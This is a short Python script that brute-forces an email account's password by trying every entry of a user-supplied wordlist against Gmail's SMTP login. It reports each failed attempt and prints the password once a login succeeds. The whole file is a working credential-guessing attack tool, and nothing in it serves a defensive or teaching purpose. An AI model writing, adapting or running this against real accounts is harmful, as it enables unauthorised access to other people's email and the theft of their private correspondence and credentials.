import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input(" <*> Enter E-Mail: ")
passwdfile = input("<*> Input a password list: ")
file = open(passwdfile, "r")

for password in file:
        password = password.strip('\n')
        try:
                smtpserver.login(user, password)
                print(colored("<+> Email password found! %s" % password, 'green'))
                break
        except smtplib.SMTPAuthenticationError:
               print(colored("<-> Wrong password... " + password, 'red'))
